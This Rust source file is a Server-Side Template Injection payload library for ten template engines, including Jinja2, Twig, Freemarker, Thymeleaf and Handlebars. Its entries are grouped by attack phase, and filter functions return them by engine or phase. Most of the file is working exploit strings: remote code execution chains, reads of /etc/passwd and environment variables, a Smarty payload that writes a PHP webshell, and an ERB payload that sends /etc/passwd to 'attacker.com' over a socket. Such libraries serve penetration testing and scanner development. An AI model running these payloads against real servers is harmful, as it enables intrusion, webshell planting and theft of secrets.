/// Server-Side Template Injection (SSTI) payload library covering every major template engine:
/// Jinja2/Python, Twig/PHP, Freemarker/Java, Velocity/Java, Mako/Python, ERB/Ruby,
/// Handlebars/JS, Pug/JS, Smarty/PHP, Thymeleaf/Java. Detection polyglots and exploitation
/// chains per engine.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    Freemarker,
    Velocity,
    Mako,
    Erb,
    Handlebars,
    Pug,
    Smarty,
    Thymeleaf,
    Polyglot,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum SstiPhase {
    Detection,
    Identification,
    Exploitation,
    Rce,
    Exfiltration,
}

#[derive(Debug, Clone)]
pub struct SstiPayload {
    pub payload: &'static str,
    pub engine: TemplateEngine,
    pub phase: SstiPhase,
    pub description: &'static str,
}

impl TemplateEngine {
    pub fn all() -> &'static [TemplateEngine] {
        &[
            TemplateEngine::Jinja2,
            TemplateEngine::Twig,
            TemplateEngine::Freemarker,
            TemplateEngine::Velocity,
            TemplateEngine::Mako,
            TemplateEngine::Erb,
            TemplateEngine::Handlebars,
            TemplateEngine::Pug,
            TemplateEngine::Smarty,
            TemplateEngine::Thymeleaf,
            TemplateEngine::Polyglot,
        ]
    }
}

impl SstiPhase {
    pub fn all() -> &'static [SstiPhase] {
        &[
            SstiPhase::Detection,
            SstiPhase::Identification,
            SstiPhase::Exploitation,
            SstiPhase::Rce,
            SstiPhase::Exfiltration,
        ]
    }
}

// ---------------------------------------------------------------------------
// Detection polyglots (work across multiple engines)
// ---------------------------------------------------------------------------
const DETECTION_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "{{7*7}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "Universal math probe — returns 49 if template evaluated",
    },
    SstiPayload {
        payload: "${7*7}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "Dollar-brace math probe (Freemarker/Velocity/Mako)",
    },
    SstiPayload {
        payload: "<%= 7*7 %>",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "ERB/JSP expression tag probe",
    },
    SstiPayload {
        payload: "#{7*7}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "Ruby/Pug interpolation probe",
    },
    SstiPayload {
        payload: "{7*7}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "Smarty single-brace probe",
    },
    SstiPayload {
        payload: "{{7*'7'}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "String multiplication — Jinja2 returns 7777777, Twig returns 49",
    },
    SstiPayload {
        payload: "a]b",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Detection,
        description: "Syntax error probe — template error in response reveals engine",
    },
    SstiPayload {
        payload: "{{''.__class__}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Python object introspection — confirms Jinja2/Mako",
    },
    SstiPayload {
        payload: "{{_self.env.display('x')}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Twig _self check",
    },
    SstiPayload {
        payload: "${class.getClass()}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Java getClass — Freemarker/Velocity",
    },
    SstiPayload {
        payload: "{{config}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Flask config leak — Jinja2 specific",
    },
    SstiPayload {
        payload: "{{settings}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Django settings leak — Jinja2/DTL",
    },
    SstiPayload {
        payload: "{{request}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Request object probe — multiple engines",
    },
    SstiPayload {
        payload: "{{self}}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Self reference probe — Mako/Jinja2",
    },
    SstiPayload {
        payload: "${T(java.lang.Runtime)}",
        engine: TemplateEngine::Polyglot,
        phase: SstiPhase::Identification,
        description: "Spring SpEL type check",
    },
];

// ---------------------------------------------------------------------------
// Jinja2 (Python / Flask / Django)
// ---------------------------------------------------------------------------
const JINJA2_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "{{''.__class__.__mro__[2].__subclasses__()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exploitation,
        description: "Jinja2 enumerate all subclasses",
    },
    SstiPayload {
        payload: "{{''.__class__.__mro__[1].__subclasses__()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exploitation,
        description: "Jinja2 MRO index variant subclass enum",
    },
    SstiPayload {
        payload: "{{''.__class__.__bases__[0].__subclasses__()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exploitation,
        description: "Jinja2 bases subclass enumeration",
    },
    SstiPayload {
        payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 config globals OS popen RCE",
    },
    SstiPayload {
        payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exfiltration,
        description: "Jinja2 file subclass index read",
    },
    SstiPayload {
        payload: "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 request application RCE chain",
    },
    SstiPayload {
        payload: "{{lipsum.__globals__['os'].popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 lipsum globals RCE",
    },
    SstiPayload {
        payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 cycler globals RCE",
    },
    SstiPayload {
        payload: "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 joiner globals RCE",
    },
    SstiPayload {
        payload: "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 namespace globals RCE",
    },
    SstiPayload {
        payload: "{%import os%}{{os.popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 import os direct RCE",
    },
    SstiPayload {
        payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 self builtins import RCE",
    },
    SstiPayload {
        payload: "{{''['\\x5f\\x5fclass\\x5f\\x5f']}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exploitation,
        description: "Jinja2 hex escape filter bypass",
    },
    SstiPayload {
        payload: "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exploitation,
        description: "Jinja2 attr filter with hex",
    },
    SstiPayload {
        payload: "{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 for-loop subclass search RCE",
    },
    SstiPayload {
        payload: "{{request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__getitem__')('json')|attr('JSONEncoder')|attr('default')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Rce,
        description: "Jinja2 filter-chain RCE (dot-free)",
    },
    SstiPayload {
        payload: "{{config.items()}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exfiltration,
        description: "Jinja2 dump all Flask config",
    },
    SstiPayload {
        payload: "{{get_flashed_messages.__globals__['current_app'].config}}",
        engine: TemplateEngine::Jinja2,
        phase: SstiPhase::Exfiltration,
        description: "Jinja2 current_app config leak",
    },
];

// ---------------------------------------------------------------------------
// Twig (PHP)
// ---------------------------------------------------------------------------
const TWIG_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig registerUndefinedFilterCallback RCE",
    },
    SstiPayload {
        payload: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig system via filter callback",
    },
    SstiPayload {
        payload: "{{['id']|filter('system')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig 3.x filter RCE",
    },
    SstiPayload {
        payload: "{{['id']|map('system')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig map filter RCE",
    },
    SstiPayload {
        payload: "{{['id']|sort('system')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig sort filter RCE",
    },
    SstiPayload {
        payload: "{{['id']|reduce('system')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Rce,
        description: "Twig reduce filter RCE",
    },
    SstiPayload {
        payload: "{{'/etc/passwd'|file_excerpt(1,30)}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Exfiltration,
        description: "Twig file_excerpt file read",
    },
    SstiPayload {
        payload: "{{app.request.server.all|join(',')}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Exfiltration,
        description: "Twig dump server variables",
    },
    SstiPayload {
        payload: "{{_self.env.getLoader()}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Identification,
        description: "Twig loader identification",
    },
    SstiPayload {
        payload: "{{app.request.query.all|join}}",
        engine: TemplateEngine::Twig,
        phase: SstiPhase::Exfiltration,
        description: "Twig dump query parameters",
    },
];

// ---------------------------------------------------------------------------
// Freemarker (Java)
// ---------------------------------------------------------------------------
const FREEMARKER_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker Execute utility RCE",
    },
    SstiPayload {
        payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker inline Execute RCE",
    },
    SstiPayload {
        payload: "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker ObjectConstructor Runtime RCE",
    },
    SstiPayload {
        payload: "${object.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker object chain Runtime RCE",
    },
    SstiPayload {
        payload: "<#assign classloader=object.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker classloader chain RCE",
    },
    SstiPayload {
        payload: "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker alternative syntax RCE",
    },
    SstiPayload {
        payload: "${.data_model.keySet()}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Exploitation,
        description: "Freemarker dump data model keys",
    },
    SstiPayload {
        payload: "${.globals}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Exploitation,
        description: "Freemarker dump globals",
    },
    SstiPayload {
        payload: "<#list .data_model as k,v>${k}=${v}</#list>",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Exfiltration,
        description: "Freemarker iterate all model data",
    },
    SstiPayload {
        payload: "${\"freemarker.template.utility.JythonRuntime\"?new()?interpret}",
        engine: TemplateEngine::Freemarker,
        phase: SstiPhase::Rce,
        description: "Freemarker JythonRuntime chain",
    },
];

// ---------------------------------------------------------------------------
// Velocity (Java)
// ---------------------------------------------------------------------------
const VELOCITY_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Rce,
        description: "Velocity full RCE with output capture",
    },
    SstiPayload {
        payload: "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Rce,
        description: "Velocity reflection chain RCE",
    },
    SstiPayload {
        payload: "#set($s=\"\")#set($c=$s.class.forName(\"java.lang.Runtime\"))#set($m=$c.getMethod(\"exec\",$s.class))#set($r=$c.getMethod(\"getRuntime\").invoke(null))$m.invoke($r,\"id\")",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Rce,
        description: "Velocity method reflection RCE",
    },
    SstiPayload {
        payload: "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Rce,
        description: "Velocity ClassTool inspect RCE",
    },
    SstiPayload {
        payload: "#set($str=$class.inspect(\"java.lang.String\").type)#set($chr=$class.inspect(\"java.lang.Character\").type)#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Rce,
        description: "Velocity ClassTool full output RCE",
    },
    SstiPayload {
        payload: "${request}",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Identification,
        description: "Velocity request object probe",
    },
    SstiPayload {
        payload: "$context.keys",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Exploitation,
        description: "Velocity dump context keys",
    },
    SstiPayload {
        payload: "#foreach($key in $context.keys)$key=$context.get($key)\n#end",
        engine: TemplateEngine::Velocity,
        phase: SstiPhase::Exfiltration,
        description: "Velocity iterate all context",
    },
];

// ---------------------------------------------------------------------------
// Mako (Python)
// ---------------------------------------------------------------------------
const MAKO_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "${self.module.cache.util.os.popen('id').read()}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Rce,
        description: "Mako self.module cache chain RCE",
    },
    SstiPayload {
        payload: "<%import os%>${os.popen('id').read()}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Rce,
        description: "Mako direct import RCE",
    },
    SstiPayload {
        payload: "<%import subprocess%>${subprocess.check_output('id',shell=True)}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Rce,
        description: "Mako subprocess RCE",
    },
    SstiPayload {
        payload: "${self.module.cache.util.os.popen('cat /etc/passwd').read()}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Exfiltration,
        description: "Mako file read via os.popen",
    },
    SstiPayload {
        payload: "<% import os; x=os.popen('id').read() %>${x}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Rce,
        description: "Mako code block RCE",
    },
    SstiPayload {
        payload: "<%!import os%>${os.environ}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Exfiltration,
        description: "Mako module-level import env dump",
    },
    SstiPayload {
        payload: "${dir(self.module.cache)}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Exploitation,
        description: "Mako enumerate cache attributes",
    },
    SstiPayload {
        payload: "${self.template.uri}",
        engine: TemplateEngine::Mako,
        phase: SstiPhase::Identification,
        description: "Mako template URI leak",
    },
];

// ---------------------------------------------------------------------------
// ERB (Ruby)
// ---------------------------------------------------------------------------
const ERB_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "<%= system('id') %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB system command RCE",
    },
    SstiPayload {
        payload: "<%= `id` %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB backtick command RCE",
    },
    SstiPayload {
        payload: "<%= IO.popen('id').read %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB IO.popen RCE",
    },
    SstiPayload {
        payload: "<%= %x(id) %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB %x literal command RCE",
    },
    SstiPayload {
        payload: "<%= exec('id') %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB exec command RCE",
    },
    SstiPayload {
        payload: "<%= open('|id').read %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Rce,
        description: "ERB open pipe RCE",
    },
    SstiPayload {
        payload: "<%= File.read('/etc/passwd') %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Exfiltration,
        description: "ERB file read",
    },
    SstiPayload {
        payload: "<%= Dir.entries('/') %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Exfiltration,
        description: "ERB directory listing",
    },
    SstiPayload {
        payload: "<%= ENV.to_a %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Exfiltration,
        description: "ERB environment dump",
    },
    SstiPayload {
        payload: "<%= require 'socket'; TCPSocket.open('attacker.com',80).puts(File.read('/etc/passwd')) %>",
        engine: TemplateEngine::Erb,
        phase: SstiPhase::Exfiltration,
        description: "ERB reverse socket exfil",
    },
];

// ---------------------------------------------------------------------------
// Handlebars (JavaScript / Node.js)
// ---------------------------------------------------------------------------
const HANDLEBARS_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Rce,
        description: "Handlebars prototype chain RCE",
    },
    SstiPayload {
        payload: "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Rce,
        description: "Handlebars constructor chain RCE",
    },
    SstiPayload {
        payload: "{{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Rce,
        description: "Handlebars this.constructor RCE",
    },
    SstiPayload {
        payload: "{{#each this}}{{@key}}: {{this}}\n{{/each}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Exploitation,
        description: "Handlebars dump all context keys",
    },
    SstiPayload {
        payload: "{{lookup this 'constructor'}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Identification,
        description: "Handlebars constructor access probe",
    },
    SstiPayload {
        payload: "{{#with this as |o|}}{{o.constructor.constructor('return process.env')()}}{{/with}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Exfiltration,
        description: "Handlebars env dump",
    },
    SstiPayload {
        payload: "{{constructor.constructor('return process.version')()}}",
        engine: TemplateEngine::Handlebars,
        phase: SstiPhase::Identification,
        description: "Handlebars Node version probe",
    },
];

// ---------------------------------------------------------------------------
// Pug/Jade (JavaScript / Node.js)
// ---------------------------------------------------------------------------
const PUG_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').execSync('id').toString();return sh}()}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Rce,
        description: "Pug global process RCE",
    },
    SstiPayload {
        payload: "-var x=global.process.mainModule.require('child_process').execSync('id').toString()\n=x",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Rce,
        description: "Pug unbuffered code RCE",
    },
    SstiPayload {
        payload: "#{global.process.mainModule.require('child_process').execSync('id')}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Rce,
        description: "Pug inline interpolation RCE",
    },
    SstiPayload {
        payload: "!{global.process.mainModule.require('child_process').execSync('id')}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Rce,
        description: "Pug unescaped interpolation RCE",
    },
    SstiPayload {
        payload: "#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Exfiltration,
        description: "Pug file read",
    },
    SstiPayload {
        payload: "#{global.process.env}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Exfiltration,
        description: "Pug env dump",
    },
    SstiPayload {
        payload: "#{global.process.version}",
        engine: TemplateEngine::Pug,
        phase: SstiPhase::Identification,
        description: "Pug node version probe",
    },
];

// ---------------------------------------------------------------------------
// Smarty (PHP)
// ---------------------------------------------------------------------------
const SMARTY_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "{system('id')}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Rce,
        description: "Smarty system function RCE",
    },
    SstiPayload {
        payload: "{php}system('id');{/php}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Rce,
        description: "Smarty php block RCE (Smarty 2)",
    },
    SstiPayload {
        payload: "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Rce,
        description: "Smarty internal writeFile webshell",
    },
    SstiPayload {
        payload: "{if phpinfo()}{/if}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Identification,
        description: "Smarty if-block phpinfo",
    },
    SstiPayload {
        payload: "{if system('id')}{/if}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Rce,
        description: "Smarty if-block RCE",
    },
    SstiPayload {
        payload: "{self::getStreamVariable(\"file:///etc/passwd\")}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Exfiltration,
        description: "Smarty stream variable file read",
    },
    SstiPayload {
        payload: "{exec}id{/exec}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Rce,
        description: "Smarty exec block (if registered)",
    },
    SstiPayload {
        payload: "{$smarty.version}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Identification,
        description: "Smarty version detection",
    },
    SstiPayload {
        payload: "{$smarty.server.SERVER_NAME}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Exfiltration,
        description: "Smarty server name leak",
    },
    SstiPayload {
        payload: "{$smarty.template}",
        engine: TemplateEngine::Smarty,
        phase: SstiPhase::Identification,
        description: "Smarty template name leak",
    },
];

// ---------------------------------------------------------------------------
// Thymeleaf (Java / Spring)
// ---------------------------------------------------------------------------
const THYMELEAF_PAYLOADS: &[SstiPayload] = &[
    SstiPayload {
        payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Rce,
        description: "Thymeleaf preprocessor expression RCE",
    },
    SstiPayload {
        payload: "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Rce,
        description: "Thymeleaf RCE with output capture",
    },
    SstiPayload {
        payload: "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Rce,
        description: "Thymeleaf Commons IO RCE",
    },
    SstiPayload {
        payload: "__${T(java.lang.System).getenv()}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Exfiltration,
        description: "Thymeleaf environment dump",
    },
    SstiPayload {
        payload: "__${T(java.lang.System).getProperty('user.dir')}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Exfiltration,
        description: "Thymeleaf working directory leak",
    },
    SstiPayload {
        payload: "${#ctx.getEnvironment().getProperty('spring.datasource.url')}",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Exfiltration,
        description: "Thymeleaf Spring datasource URL leak",
    },
    SstiPayload {
        payload: "${#strings.toString(#ctx)}",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Exploitation,
        description: "Thymeleaf dump context",
    },
    SstiPayload {
        payload: "__${new java.io.BufferedReader(new java.io.FileReader('/etc/passwd')).readLine()}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Exfiltration,
        description: "Thymeleaf file read via BufferedReader",
    },
    SstiPayload {
        payload: "${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Rce,
        description: "Thymeleaf array exec RCE",
    },
    SstiPayload {
        payload: "__${T(java.lang.Thread).currentThread().getContextClassLoader().loadClass('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'id')}__::.x",
        engine: TemplateEngine::Thymeleaf,
        phase: SstiPhase::Rce,
        description: "Thymeleaf classloader reflection RCE",
    },
];

/// Returns all SSTI payloads.
pub fn all_ssti_payloads() -> Vec<&'static SstiPayload> {
    let mut all = Vec::with_capacity(200);
    all.extend(DETECTION_PAYLOADS.iter());
    all.extend(JINJA2_PAYLOADS.iter());
    all.extend(TWIG_PAYLOADS.iter());
    all.extend(FREEMARKER_PAYLOADS.iter());
    all.extend(VELOCITY_PAYLOADS.iter());
    all.extend(MAKO_PAYLOADS.iter());
    all.extend(ERB_PAYLOADS.iter());
    all.extend(HANDLEBARS_PAYLOADS.iter());
    all.extend(PUG_PAYLOADS.iter());
    all.extend(SMARTY_PAYLOADS.iter());
    all.extend(THYMELEAF_PAYLOADS.iter());
    all
}

/// Filter payloads by template engine.
pub fn ssti_payloads_by_engine(engine: TemplateEngine) -> Vec<&'static SstiPayload> {
    all_ssti_payloads()
        .into_iter()
        .filter(|p| p.engine == engine)
        .collect()
}

/// Filter payloads by attack phase.
pub fn ssti_payloads_by_phase(phase: SstiPhase) -> Vec<&'static SstiPayload> {
    all_ssti_payloads()
        .into_iter()
        .filter(|p| p.phase == phase)
        .collect()
}

/// Return all RCE payloads (the most critical for exploitation).
pub fn ssti_rce_payloads() -> Vec<&'static SstiPayload> {
    ssti_payloads_by_phase(SstiPhase::Rce)
}

/// Total count of all SSTI payloads.
pub fn ssti_payload_count() -> usize {
    DETECTION_PAYLOADS.len()
        + JINJA2_PAYLOADS.len()
        + TWIG_PAYLOADS.len()
        + FREEMARKER_PAYLOADS.len()
        + VELOCITY_PAYLOADS.len()
        + MAKO_PAYLOADS.len()
        + ERB_PAYLOADS.len()
        + HANDLEBARS_PAYLOADS.len()
        + PUG_PAYLOADS.len()
        + SMARTY_PAYLOADS.len()
        + THYMELEAF_PAYLOADS.len()
}
